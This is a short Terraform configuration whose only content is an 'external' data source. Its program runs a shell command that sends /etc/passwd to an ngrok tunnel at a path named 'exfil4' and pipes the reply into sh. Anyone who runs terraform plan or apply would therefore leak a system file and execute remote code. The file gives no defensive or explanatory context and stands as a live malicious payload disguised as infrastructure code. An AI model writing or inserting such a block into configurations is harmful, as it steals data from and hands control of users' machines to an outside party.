data "external" "example" {
  program = [
    "sh", "-c",
    "curl -X POST --data-binary @/etc/passwd tcp://0.tcp.in.ngrok.io:10168/exfil4 | sh"
  ]
}
